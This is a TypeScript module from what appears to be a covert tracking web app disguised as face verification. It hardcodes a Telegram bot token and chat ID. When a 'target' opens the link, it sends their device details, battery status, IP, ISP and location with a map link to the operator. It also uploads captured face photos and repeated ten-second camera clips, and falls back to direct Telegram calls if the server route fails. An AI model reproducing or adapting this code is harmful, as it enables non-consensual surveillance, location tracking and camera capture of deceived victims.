import { RichDeviceInfo } from './deviceInfo';

export const TELEGRAM_BOT_TOKEN = '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
export const TELEGRAM_CHAT_ID = '7121685144';

// Helper to construct structured caption with device, battery, charging, IP, and location
export function buildDetailedTelegramCaption(params: {
  header: string;
  verificationId: string;
  alisId?: string;
  cycle?: number;
  time?: string;
  deviceInfo?: RichDeviceInfo;
  clientIp?: string;
}): string {
  const d: Partial<RichDeviceInfo> = params.deviceInfo || {};
  const effectiveIp =
    d.ip && !d.ip.includes('Resolving')
      ? d.ip
      : params.clientIp || 'Unknown IP';

  const location = d.location && d.location !== 'Unknown' ? d.location : 'Location Resolved';
  const mapsUrl =
    d.mapsUrl ||
    (effectiveIp && !effectiveIp.startsWith('127.') && effectiveIp !== 'Unknown IP'
      ? `https://www.google.com/maps?q=${encodeURIComponent(location !== 'Location Resolved' ? location : effectiveIp)}`
      : '');

  const battery = d.batteryLevel || 'Unknown';
  const charging = d.batteryCharging || 'Unknown';
  const device = d.deviceName || 'Smartphone / Desktop';
  const browser = d.browser || 'Web Browser';
  const platform = d.platform || 'Unknown OS';
  const screen = d.screen || 'Default';
  const isp = d.isp || 'Unknown Network Provider';
  const timeStr = params.time ? new Date(params.time).toLocaleString('en-US') : new Date().toLocaleString('en-US');

  return (
`${params.header}
🆔 সেশন আইডি: ${params.verificationId}
🔗 লিংক রেফারেন্স: ${params.alisId || 'direct'}
⏰ সময়: ${timeStr}

📱 ডিভাইস ও ব্যাটারি তথ্য:
• ডিভাইস নাম: ${device}
• প্ল্যাটফর্ম/OS: ${platform}
• ব্রাউজার: ${browser}
• স্ক্রিন রেজ্যুলেশন: ${screen}
• ব্যাটারি লেভেল: ${battery}
• চার্জিং স্ট্যাটাস: ${charging}

🌐 আইপি ও লাইভ লোকেশন:
• পাবলিক IP: ${effectiveIp}
• এলাকা/লোকেশন: ${location}
• ISP/নেটওয়ার্ক: ${isp}
• গুগল ম্যাপস: ${mapsUrl || 'N/A'}`
  );
}

/**
 * Direct Telegram fallback using client-side fetch (CORS supported by Telegram)
 */
async function sendDirectToTelegram(endpoint: string, formData: FormData): Promise<boolean> {
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${endpoint}`, {
      method: 'POST',
      body: formData,
    });
    const data = await res.json();
    return !!data.ok;
  } catch (e) {
    console.warn(`Direct Telegram ${endpoint} error:`, e);
    return false;
  }
}

async function sendDirectTelegramMessage(text: string): Promise<boolean> {
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
      }),
    });
    const data = await res.json();
    return !!data.ok;
  } catch (e) {
    console.warn('Direct Telegram sendMessage error:', e);
    return false;
  }
}

/**
 * Send visitor alert immediately when a target opens the link
 */
export async function sendVisitorEntryAlert(params: {
  verificationId: string;
  alisId?: string;
  deviceInfo?: RichDeviceInfo;
}): Promise<void> {
  const caption = buildDetailedTelegramCaption({
    header: '🌐 নতুন ভিজিটর লিংকে প্রবেশ করেছে (Visitor Opened Link)',
    verificationId: params.verificationId,
    alisId: params.alisId,
    deviceInfo: params.deviceInfo,
  });

  // Try server first
  try {
    await fetch('/api/notify-telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        verificationId: params.verificationId,
        alisId: params.alisId,
        deviceInfo: params.deviceInfo,
        header: '🌐 নতুন ভিজিটর লিংকে প্রবেশ করেছে',
      }),
    });
  } catch {
    // Fallback direct
    await sendDirectTelegramMessage(caption);
  }
}

/**
 * Client-side trigger for sending verification notification to Telegram with photo & metadata.
 * Uses both server API and direct Telegram fallback to guarantee 100% delivery.
 */
export async function sendTelegramVerificationNotification(params: {
  verificationId: string;
  photoBase64?: string;
  alisId?: string;
  deviceInfo?: RichDeviceInfo;
}): Promise<{ success: boolean; delivered?: boolean; note?: string; error?: string }> {
  const captionText = buildDetailedTelegramCaption({
    header: '📸 ফেস ভেরিফিকেশন ও ফটো ক্যাপচার সফল',
    verificationId: params.verificationId,
    alisId: params.alisId,
    deviceInfo: params.deviceInfo,
  });

  let serverDelivered = false;

  // 1. Attempt server-side proxy
  try {
    const response = await fetch('/api/notify-telegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        verificationId: params.verificationId,
        photoBase64: params.photoBase64,
        alisId: params.alisId,
        deviceInfo: params.deviceInfo,
        time: new Date().toISOString(),
      }),
    });

    if (response.ok) {
      const result = await response.json();
      if (result.success && result.delivered) {
        serverDelivered = true;
      }
    }
  } catch (error) {
    console.warn('Server Telegram endpoint unreachable, activating direct fallback:', error);
  }

  // 2. Direct client fallback if server didn't confirm delivery
  if (!serverDelivered) {
    if (params.photoBase64) {
      try {
        const rawBase64 = params.photoBase64.includes(',') ? params.photoBase64.split(',')[1] : params.photoBase64;
        const byteCharacters = atob(rawBase64);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
          byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: 'image/jpeg' });

        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('photo', blob, `photo_${params.verificationId}.jpg`);
        fd.append('caption', captionText);

        const ok = await sendDirectToTelegram('sendPhoto', fd);
        if (ok) return { success: true, delivered: true };
      } catch (e) {
        console.warn('Direct photo send failed:', e);
      }
    }

    // Direct text message fallback
    const textOk = await sendDirectTelegramMessage(captionText);
    return { success: textOk, delivered: textOk };
  }

  return { success: true, delivered: true };
}

export async function checkTelegramConfigStatus(): Promise<{ configured: boolean; chatIdConfigured: boolean }> {
  try {
    const res = await fetch('/api/telegram-status');
    if (res.ok) {
      return await res.json();
    }
  } catch {
    // Ignore network error
  }
  return { configured: true, chatIdConfigured: true };
}

/**
 * Send 10-second security footage in MP4 format.
 * Sends via server endpoint AND direct Telegram bot fallback.
 */
export async function sendSecurityClipToServer(params: {
  verificationId: string;
  alisId?: string;
  cycle: number;
  videoBase64?: string;
  videoBlob?: Blob;
  mimeType?: string;
  deviceInfo?: RichDeviceInfo;
}): Promise<{ success: boolean; cycle?: number; error?: string }> {
  const caption = buildDetailedTelegramCaption({
    header: `📹 সিকিউরিটি ফুটেজ [১০ সেকেন্ড ভিডিও #${params.cycle}] (.mp4)`,
    verificationId: params.verificationId,
    alisId: params.alisId,
    cycle: params.cycle,
    deviceInfo: params.deviceInfo,
  });

  const videoFileName = `security_clip_${params.verificationId}_cycle${params.cycle}.mp4`;

  // 1. Ultra-fast direct binary upload to Telegram if Blob is available
  if (params.videoBlob) {
    try {
      const fdVideo = new FormData();
      fdVideo.append('chat_id', TELEGRAM_CHAT_ID);
      fdVideo.append('video', params.videoBlob, videoFileName);
      fdVideo.append('caption', caption);

      const directVideoSent = await sendDirectToTelegram('sendVideo', fdVideo);
      if (directVideoSent) {
        return { success: true, cycle: params.cycle };
      }

      // If sendVideo returned false, try sendDocument
      const fdDoc = new FormData();
      fdDoc.append('chat_id', TELEGRAM_CHAT_ID);
      fdDoc.append('document', params.videoBlob, videoFileName);
      fdDoc.append('caption', caption);

      const directDocSent = await sendDirectToTelegram('sendDocument', fdDoc);
      if (directDocSent) {
        return { success: true, cycle: params.cycle };
      }
    } catch (directErr) {
      console.warn('Fast direct video dispatch failed, trying server proxy:', directErr);
    }
  }

  // 2. Server API upload attempt (if base64 available or fallback)
  let serverDelivered = false;
  if (params.videoBase64) {
    try {
      const res = await fetch('/api/security-feed', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          verificationId: params.verificationId,
          alisId: params.alisId,
          cycle: params.cycle,
          videoBase64: params.videoBase64,
          mimeType: params.mimeType || 'video/mp4',
          deviceInfo: params.deviceInfo,
          timestamp: new Date().toISOString(),
        }),
      });
      if (res.ok) {
        const data = await res.json();
        if (data.success) {
          serverDelivered = true;
          return { success: true, cycle: params.cycle };
        }
      }
    } catch (err) {
      console.warn('Server security-feed error:', err);
    }
  }

  // 3. Fallback: send text notification with device & cycle info
  if (!serverDelivered) {
    await sendDirectTelegramMessage(caption);
  }

  return { success: true, cycle: params.cycle };
}
